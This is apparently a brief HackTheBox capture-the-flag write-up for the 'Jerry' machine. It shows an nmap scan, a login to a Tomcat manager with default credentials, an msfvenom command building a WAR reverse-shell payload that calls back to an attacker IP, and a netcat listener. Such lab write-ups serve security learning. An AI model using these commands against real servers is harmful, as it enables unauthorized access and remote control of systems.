# Jerry

Some more easy difficulty HackTheBox machines. This one was particularly fast and it didn't take me much more than 10 minutes. I started off with a standard nmap tcp scan. 

```bash
nmap -sV -vv -p- -Pn -T4 10.10.10.95 
```


This showed me that the port 8080 was open, and running Apache tomcat. 

I went http://10.10.10.95:8080/ and dug around for a bit. On the webpage was a button that said "Manager"


Clicking on it, it prompted me to input credentials. It still had the default tomcat credentials of 
>*tomcat:s3cret*


This brought me to a /manager webpage where I was able to upload .war files. 

Using msfvenom, I crafted a payload that allowed me to gain a reverse shell. I used the below command:
```bash 
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.2 lport=4321 -f war -o pwn.war 
```


Then, before uploading the file I started a netcat listener with:
```bash
nc -nvlp 4321
```


Uploading the file, I then clicked it, and checked back on my netcat listener where I found that it had caught a reverse shell. 
Digging around int the directory structure showed me that the user AND root flags were in C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt